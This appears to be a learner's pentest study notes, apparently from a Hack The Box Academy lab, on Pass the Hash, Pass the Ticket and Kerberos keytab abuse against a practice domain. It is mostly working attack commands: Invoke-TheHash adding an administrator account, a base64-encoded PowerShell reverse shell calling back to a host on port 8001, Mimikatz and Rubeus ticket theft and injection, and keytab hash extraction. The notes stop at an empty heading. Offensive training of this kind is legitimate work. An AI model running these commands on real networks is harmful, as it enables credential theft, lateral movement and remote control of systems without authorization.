### Pass the Hash with PowerShell Invoke-TheHash (Windows)

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution

```powershell-session
Import-Module .\Invoke-TheHash.psd1
```
`Invoke-TheHash with SMB`
```powershell-session
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
`Here we can also execute an rev shell here to get an shell`

[[revshells.com|revshells]]



```powershell-session
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
`Invoke-TheHash with WMI using it to get an rev shell on port 8001`


### Pass the Hash with Impacket (Linux)

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
`Pass the Hash with Impacket PsExec`


There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


### Pass the Hash with NetExec (Linux)


```shell-session
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
`Pass the hash with netexec`

```shell-session
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
`Command execution with Netexec`

### Evil-winrm Pass the hash

```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
`Pass the hash with evil-wirm`


### Pass the hash RDP

```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
` Enable Restricted Admin Mode to allow PtH`

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
`Pass the hash using RDP`


## Pass the Ticket (PtT) from Windows

Another method for moving laterally in an Active Directory environment is called a [[PtT) attack](PtT|Pass the Ticket (PtT) attack]]%20attack). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash



- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

If the user wants to connect to an MSSQL database, it will request a `Ticket Granting Service` (`TGS`) to the `Key Distribution Center` (`KDC`), presenting its `Ticket Granting Ticket` (`TGT`). Then it will give the TGS to the MSSQL database server for authentication.

It's recommended to take a look at the [Kerberos, DNS, LDAP, MSRPC](https://academy.hackthebox.com/module/74/section/701) section in the module [Introduction to Active Directory](https://academy.hackthebox.com/module/details/74) for a high-level overview of how this protocol works.



### Harvesting Kerberos tickets from Windows


```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::tickets /export
```
`Mimikatz - TO Export tickets`


```cmd-session
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```
```
plaintext@krbtgt-inlanefreight.htb.kirbi this is an TGT
450000-DC01$@cifs-DC01.inlanefreight.htb.kirbi this is an TGS
```


We can also export tickets using `Rubeus` and the option `dump`.

```cmd-session
Rubeus.exe dump /nowrap
```
`Rubeus - Export tickets`

### Forging OUr OWN TICKETS


### Pass the Key aka. OverPass the Hash

The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`)


```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::ekeys
```
`USing this you will have access to the AES256_HMAC and RC4_HMACkeys,`


```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
`Mimikatz - Pass the Key aka. OverPass the Hash This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user`



```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
`Rubeus - Pass the Key aka. OverPass the Hash using this you will get the Base64(ticket.kirbi)`


Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't


### Pass the Ticket (PtT)

#### Rubeus - Pass the Ticket

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
`we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.`


```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
`We can import Ticket from mimikatz to Rubeus`

#### Pass the Ticket - Base64 Format

```powershell-session
Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
`TO conver the ticket into Base64 string so that you can give it to Rubeus`

```cmd-session
Rubeus.exe ptt /ticket:<Base64 String>
```
`Give the base64 ticket stirng to import using Rubeus`



#### Mimikatz - Pass the Ticket

```cmd-session
privilege::debug
```
```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
```cmd-session
dir \\DC01.inlanefreight.htb\c$
```
`USing  mimi to perform PTT`


### Pass The Ticket with PowerShell Remoting (Windows)

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.


#### Mimikatz - PowerShell Remoting with Pass the Ticket


```cmd-session
privilege::debug
```
```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
```cmd-session
exit
```
```cmd-session
powershell
```
```cmd-session
Enter-PSSession -ComputerName DC01
```
`USint the Ticket to do lateral movement as John` 


#### Rubeus - PowerShell Remoting with Pass the Ticket


```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
`THis will start another clean CMD to disguise yourself`

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
`Run this in the disguised cmd to perform the ptt then PSremote`
```cmd-session
exit
```
```cmd-session
powershell
```
```cmd-session
Enter-PSSession -ComputerName DC01
```


## Pass the Ticket from Linux

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`


Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) files. A `keytab` is a file containing pairs of Kerberos principals and encrypted keys

You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.


#### Identifying Linux and Active Directory integration

```shell-session
realm list
```
`Check if Linux machine is domain-joined`

```shell-session
ps -ef | grep -i "winbind\|sssd"
```
`If you see the domain name in the output then it is DOmain joined`


#### Finding Kerberos tickets in Linux

```shell-session
find / -name *keytab* -ls 2>/dev/null
```
`Trying to find keytables files`


```shell-session
crontab -l
```
`In crons if you someything like kinit(allows to interat with kerberos and request TGT) svc_workstations.kt then it is an keytable file`


efault at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

#### Finding ccache files

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```
`Reviewing environment variables for ccache files`


```shell-session
ls -la /tmp
```
` Searching for ccache files in /tmp`

### Abusing KeyTab files

The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for

```shell-session
klist -k -t /opt/specialfiles/carlos.keytab 
```
`TO find info regarding the Keytab file like which user it belongs to like this carlos@INLANEFREIGHT.HTB`

```shell-session
klist
```
`THis will list the current keyTab we are using in our session if it does not belong to the user we are trying to impersonate then we need to import it's keytab`

```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
`Importing the users keytab we are targeting`

```shell-session
smbclient //dc01/carlos -k -c ls
```
`Trying to asses it's share`


#### KeyTab Extract

```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
`this will extract NTLM etc hashes form the keytab file `

```
after getting the NTLM hash we can crack it using crackstation
```

```shell-session
su - carlos@inlanefreight.htb
```
`To login as Carlos`


### Abusing KeyTab ccache

